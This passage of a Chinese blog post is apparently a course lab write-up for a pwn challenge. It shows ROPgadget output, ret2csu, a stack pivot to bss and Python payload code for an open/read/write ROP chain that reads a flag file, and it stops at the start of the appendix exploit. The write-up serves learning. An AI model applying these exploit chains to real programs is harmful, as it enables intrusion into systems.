class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;.plt.sec:0000000000401100 _open           proc near               ; CODE XREF: some_gifts+1D↓p&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt.sec:0000000000401100                 endbr64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt.sec:0000000000401104                 bnd jmp cs:off_404040&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt.sec:0000000000401104 _open           endp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt.sec:00000000004010D0 _read           proc near               ; CODE XREF: vuln+40↓p&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt.sec:00000000004010D0                 endbr64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt.sec:00000000004010D4                 bnd jmp cs:off_404028&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt.sec:00000000004010D4 _read           endp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt.sec:00000000004010C0 _write          proc near               ; CODE XREF: main+88↓p&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt.sec:00000000004010C0                                         ; main+9E↓p&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt.sec:00000000004010C0                 endbr64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt.sec:00000000004010C4                 bnd jmp cs:off_404020&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt.sec:00000000004010C4 _write          endp&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​	或者用elf.plt[‘read’]来获取&lt;/p&gt;
&lt;h4 id=&#34;3-2-gadget&#34;&gt;&lt;a href=&#34;#3-2-gadget&#34; class=&#34;headerlink&#34; title=&#34;3.2 gadget&#34;&gt;&lt;/a&gt;3.2 gadget&lt;/h4&gt;&lt;p&gt;​		amd64-64-little, x64架构下,目前应用的调用约定是fastcal,前三个传参的寄存器是rdi rsi rdx &lt;/p&gt;
&lt;p&gt;​		利用工具ROPgadget寻找可用的gadget,找到了rdi和rsi,未找到rdx,rdx的值并不一定总会影响函数的调用,要根据具体情况而定,在本题中,经过测试是会影响的,在read读取flag的时候,rdx代表着读取的长度,经过调试发现被设置为了0,所以读取的是空的.因此需要找到一个能设置rdx寄存器的gadget,会在后续章节说明.&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@VM-24-10-ubuntu:/tmp/330# ROPgadget --binary rop  --only &amp;#x27;pop|ret&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Gadgets information&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;============================================================&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x000000000040147c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x000000000040147e : pop r13 ; pop r14 ; pop r15 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x0000000000401480 : pop r14 ; pop r15 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x0000000000401482 : pop r15 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x000000000040147b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x000000000040147f : pop rbp ; pop r14 ; pop r15 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x00000000004011fd : pop rbp ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x0000000000401483 : pop rdi ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x0000000000401481 : pop rsi ; pop r15 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x000000000040147d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x000000000040101a : ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x0000000000401277 : ret 0x2be&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Unique gadgets found: 12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x0000000000401483 : pop rdi ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x0000000000401481 : pop rsi ; pop r15 ; ret&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h5 id=&#34;3-2-1-ret2csu&#34;&gt;&lt;a href=&#34;#3-2-1-ret2csu&#34; class=&#34;headerlink&#34; title=&#34;3.2.1 ret2csu&#34;&gt;&lt;/a&gt;3.2.1 ret2csu&lt;/h5&gt;&lt;p&gt;​		不同架构的csu代码是不一样的,要根据具体情况而定,就此题的架构而言,csu代码如下&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%AE%9E%E9%AA%8C%E4%BA%8C-pwn1-%E6%A0%88/Untitled.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		先执行loc_401476里面的代码,进行pop赋值,ret后再执行loc_401460的代码,对传参寄存器进行赋值,然后再利用call 转移控制流&lt;/p&gt;
&lt;p&gt;​		rdi rsi rdx 分别对应着第一次要输入的 r12,r13,r14,call的地址是[r15+rbx*8],可以设置r15为存储跳转地址的地址,rbx为0&lt;/p&gt;
&lt;p&gt;​		设置rbp为1,rbx为0,即可继续往下执行&lt;/p&gt;
&lt;h5 id=&#34;3-2-2-栈迁移的gadget&#34;&gt;&lt;a href=&#34;#3-2-2-栈迁移的gadget&#34; class=&#34;headerlink&#34; title=&#34;3.2.2 栈迁移的gadget&#34;&gt;&lt;/a&gt;3.2.2 栈迁移的gadget&lt;/h5&gt;&lt;p&gt;​		由于只能溢出8字节,是不够布置gadget链的,需要扩展栈空间,通常用的手法是进行栈迁移,移动到一个更大的空间去&lt;/p&gt;
&lt;p&gt;​		leave  &amp;#x3D;&amp;#x3D; mov rsp,rbp;pop rbp;&lt;br&gt;​		ret    &amp;#x3D;&amp;#x3D; pop rip &lt;em&gt;#弹出栈顶数据给rip寄存器&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;​		利用两次leave;ret; 即可控制rsp&lt;/p&gt;
&lt;p&gt;​		mov rsp,rbp;    &amp;#x2F;&amp;#x2F;第一个rbp不受我们的控制，但是下面pop的rbp可以被我们更改，从而就可以控制第二个leave里面的rsp&lt;br&gt;​		pop rbp;&lt;br&gt;​		mov rsp,rbp;&lt;br&gt;​		pop rbp;&lt;br&gt;​		pop rip	&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@VM-24-10-ubuntu:/home/ubuntu/330# ROPgadget --binary rop  --only &amp;#x27;leave|ret&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Gadgets information&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;============================================================&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x00000000004012a7 : leave ; ret&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;4-迁移到bss&#34;&gt;&lt;a href=&#34;#4-迁移到bss&#34; class=&#34;headerlink&#34; title=&#34;4. 迁移到bss&#34;&gt;&lt;/a&gt;4. 迁移到bss&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%AE%9E%E9%AA%8C%E4%BA%8C-pwn1-%E6%A0%88/stackpivot.drawio.png&#34; alt=&#34;stackpivot.drawio&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		只迁移是不够的,同时应该做到在迁移到的新地方布置好rop链,一个想法是,调用vuln()函数中的read,既可以读取0x110的数据,最后也有leave;ret;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000401304 loc_401304:                             ; CODE XREF: vuln+20↑j&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000401304                 lea     rax, [rbp+buf]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:000000000040130B                 mov     edx, 110h       ; nbytes&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000401310                 mov     rsi, rax        ; buf&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000401313                 mov     edi, 0          ; fd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000401318                 call    _read&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:000000000040131D                 nop&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:000000000040131E                 leave&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:000000000040131F                 retn&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;​		但是这里有一个问题,数据被写入的地方不是rbp,而是rbp-0x100,而经过两次leave;ret;后修改的rsp的值是原始rbp的值,所以还是到达不了rop链的位置,因此,需要第三次的leave;ret;再次修正rsp的位置,这样的话,在第二次leave;ret;的时候,rbp设置为写入地址-0x108,然后第三次leave;ret;就把rsp设置为了rop链的开头&lt;/p&gt;
&lt;p&gt;​		设置成0x108是因为在最后一个leave;ret;的时候,mov rsp,rbp,转移栈成功后,要pop出来rbp然后栈往下移动8字节,这个多的0x8用来抵消pop rbp.&lt;/p&gt;
&lt;h3 id=&#34;5-构造ROP链-实现orw&#34;&gt;&lt;a href=&#34;#5-构造ROP链-实现orw&#34; class=&#34;headerlink&#34; title=&#34;5. 构造ROP链, 实现orw&#34;&gt;&lt;/a&gt;5. 构造ROP链, 实现orw&lt;/h3&gt;&lt;h4 id=&#34;5-1-构造orw&#34;&gt;&lt;a href=&#34;#5-1-构造orw&#34; class=&#34;headerlink&#34; title=&#34;5.1 构造orw&#34;&gt;&lt;/a&gt;5.1 构造orw&lt;/h4&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;payload1 = p64(poprdi) + p64(&lt;span class=&#34;string&#34;&gt;&amp;quot;0&amp;quot;&lt;/span&gt;) + p64(poprsi)+ p64(bssaddr2) +p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)+ p64(readaddr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload1 +=  p64(poprdi) +  p64(bssaddr2) + p64(poprsi) + p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)+p64(openaddr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload1 += p64(poprdi) + p64(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;) + p64(poprsi) + p64(bssaddr2) +p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)+ p64(readaddr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload1 += p64(poprdi) + p64(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) + p64(poprsi) + p64(bssaddr2) +p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) +p64(writeaddr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		四行的用途分别是&lt;/p&gt;
&lt;p&gt;​		从用户标准输入中读取 .&amp;#x2F;flag 字符,用于后面的open&lt;/p&gt;
&lt;p&gt;​		open .&amp;#x2F;flag 这个文件,得到文件句柄3&lt;/p&gt;
&lt;p&gt;​		read 读取具柄3,读取到bss区域&lt;/p&gt;
&lt;p&gt;​		write 将flag所在bss区域内容输入到标准输出中&lt;/p&gt;
&lt;p&gt;​		在调试中可以看到,在执行第三行操作,即read时,rdx的值被设置成了0,于是需要设置rdx的gadget&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%AE%9E%E9%AA%8C%E4%BA%8C-pwn1-%E6%A0%88/image-20230403142700054.png&#34; alt=&#34;image-20230403142700054&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;5-2-利用ret2csu构造-read的参数&#34;&gt;&lt;a href=&#34;#5-2-利用ret2csu构造-read的参数&#34; class=&#34;headerlink&#34; title=&#34;5.2 利用ret2csu构造 read的参数&#34;&gt;&lt;/a&gt;5.2 利用ret2csu构造 read的参数&lt;/h4&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;csu_front_addr = 0x0000000000401460&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;csu_end_addr = 0x000000000040147a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def csu(rbx, rbp, r12, r13, r14, r15):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		# rdi rsi rdx 分别对应着 r12,r13,r14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		# call的地址是[r15+rbx*8], 可以设置r15为地址,rbx为0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		# r15这个地址存储的数据是要call的函数的地址&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    payloadtemp = p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    payloadtemp += p64(csu_front_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return payloadtemp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# r12 + rbx*8 = 0x0004010C0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;temp = csu(0,1,3,bssaddr2,50,0x0404e24)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		要call的地址是[r15+rbx*8], 所以需要找到一个地址,存储着read函数的地址,在尝试利用5.1节第一行payload中存储rop链的中的bss地址中的read地址时发现,后面会被覆盖掉.可以在payload之后,再加上read函数的地址. 计算或者调试出存储其地址的地址.&lt;/p&gt;
&lt;h4 id=&#34;5-3-利用ret2csu继续构造-write的参数&#34;&gt;&lt;a href=&#34;#5-3-利用ret2csu继续构造-write的参数&#34; class=&#34;headerlink&#34; title=&#34;5.3 利用ret2csu继续构造 write的参数&#34;&gt;&lt;/a&gt;5.3 利用ret2csu继续构造 write的参数&lt;/h4&gt;&lt;p&gt;​		在上一步时,设置rbx&amp;#x3D;1,rbp&amp;#x3D;1,即可以让程序继续往下执行,进入第二轮ret2csu,与5.2中的方法类似,构造write的参数&lt;/p&gt;
&lt;p&gt;​		完整exp见附录&lt;/p&gt;
&lt;h1 id=&#34;第二章-题目技术点总结&#34;&gt;&lt;a href=&#34;#第二章-题目技术点总结&#34; class=&#34;headerlink&#34; title=&#34;第二章 题目技术点总结&#34;&gt;&lt;/a&gt;第二章 题目技术点总结&lt;/h1&gt;&lt;h2 id=&#34;一-ORW&#34;&gt;&lt;a href=&#34;#一-ORW&#34; class=&#34;headerlink&#34; title=&#34;一. ORW&#34;&gt;&lt;/a&gt;一. ORW&lt;/h2&gt;&lt;p&gt;​		ORW利用了Linux中的open&amp;#x2F;read&amp;#x2F;write系统调用来执行操作,通常在限制了系统调用的时候使用,在ctf中根本目标是获取flag,所以在拿不到系统权限的时候可以通过该中方法进行获取flag.&lt;/p&gt;
&lt;p&gt;​		orw有很多种不同的系统调用可以使用,并且在不同架构下也有不一样的,根据seccomp具体的限制可以使用不同的方法.&lt;/p&gt;
&lt;p&gt;​		需要注意的是,在做题目时,要根据具体的系统版本来寻找系统调用,在最新版本中有可能加入新的可用的系统调用.&lt;/p&gt;
&lt;h2 id=&#34;二-seccomp&#34;&gt;&lt;a href=&#34;#二-seccomp&#34; class=&#34;headerlink&#34; title=&#34;二. seccomp&#34;&gt;&lt;/a&gt;二. seccomp&lt;/h2&gt;&lt;p&gt;​		seccomp是一种在ctf pwn中常用的安全机制，可用于限制程序对系统调用的访问。通过使用seccomp，可以有效地降低程序受到攻击的风险。&lt;/p&gt;
&lt;h2 id=&#34;三-ret2csu&#34;&gt;&lt;a href=&#34;#三-ret2csu&#34; class=&#34;headerlink&#34; title=&#34;三. ret2csu&#34;&gt;&lt;/a&gt;三. ret2csu&lt;/h2&gt;&lt;p&gt;​		ret2csu是一种在ctf pwn中常用的技术，可用于在程序没有可用的gadget的情况下构造ROP链。它利用了一个特殊的函数__libc_csu_init来调用函数，并利用程序的堆栈来构造ROP链。&lt;/p&gt;
&lt;h2 id=&#34;四-栈迁移&#34;&gt;&lt;a href=&#34;#四-栈迁移&#34; class=&#34;headerlink&#34; title=&#34;四. 栈迁移&#34;&gt;&lt;/a&gt;四. 栈迁移&lt;/h2&gt;&lt;p&gt;​		可用于在程序栈空间不足的情况下，通过将栈迁移到bss段、堆等来执行攻击,也可以利用sub rsp等gadget来增加栈的长度.通常使用的是leave;ret;方法,第一次leave;ret;控制rbp,第二次可以控制rsp&lt;/p&gt;
&lt;h1 id=&#34;第三章-错误处理&#34;&gt;&lt;a href=&#34;#第三章-错误处理&#34; class=&#34;headerlink&#34; title=&#34;第三章 错误处理&#34;&gt;&lt;/a&gt;第三章 错误处理&lt;/h1&gt;&lt;h2 id=&#34;一-open时出错&#34;&gt;&lt;a href=&#34;#一-open时出错&#34; class=&#34;headerlink&#34; title=&#34;一. open时出错&#34;&gt;&lt;/a&gt;一. open时出错&lt;/h2&gt;&lt;p&gt;​		bss段给的地址太小,在动态解析的时候,栈会移动到不可写的地方,导致出错,将bss往后移动多一点即可&lt;/p&gt;
&lt;h2 id=&#34;二-orw-不设置rdx-本地可以打通-远程不可以&#34;&gt;&lt;a href=&#34;#二-orw-不设置rdx-本地可以打通-远程不可以&#34; class=&#34;headerlink&#34; title=&#34;二. orw(不设置rdx) 本地可以打通,远程不可以&#34;&gt;&lt;/a&gt;二. orw(不设置rdx) 本地可以打通,远程不可以&lt;/h2&gt;&lt;p&gt;​		是libc版本的问题,把版本切换到2.27(题目版本)后即可发现,在read时,rdx被设置为了0,因此需要找到能够设置rdx的gadget&lt;/p&gt;
&lt;h2 id&gt;&lt;a href=&#34;#&#34; class=&#34;headerlink&#34; title&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h1 id=&#34;参考资料&#34;&gt;&lt;a href=&#34;#参考资料&#34; class=&#34;headerlink&#34; title=&#34;参考资料&#34;&gt;&lt;/a&gt;参考资料&lt;/h1&gt;&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_34010404/article/details/123809796&#34;&gt;https://blog.csdn.net/qq_34010404&amp;#x2F;article&amp;#x2F;details&amp;#x2F;123809796&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/mcmuyanga/article/details/113389703&#34;&gt;https://blog.csdn.net/mcmuyanga/article/details/113389703&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_45691294/article/details/112196127&#34;&gt;https://blog.csdn.net/qq_45691294&amp;#x2F;article&amp;#x2F;details&amp;#x2F;112196127&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_41696518/article/details/126665825&#34;&gt;https://blog.csdn.net/qq_41696518&amp;#x2F;article&amp;#x2F;details&amp;#x2F;126665825&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_41202237/article/details/105913597&#34;&gt;https://blog.csdn.net/qq_41202237&amp;#x2F;article&amp;#x2F;details&amp;#x2F;105913597&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/t/12189&#34;&gt;https://xz.aliyun.com/t/12189&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;附录&#34;&gt;&lt;a href=&#34;#附录&#34; class=&#34;headerlink&#34; title=&#34;附录:&#34;&gt;&lt;/a&gt;附录:&lt;/h1&gt;&lt;h2 id=&#34;exp&#34;&gt;&lt;a href=&#34;#exp&#34; class=&#34;headerlink&#34; title=&#34;exp&#34;&gt;&lt;/a&gt;exp&lt;/h2&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span 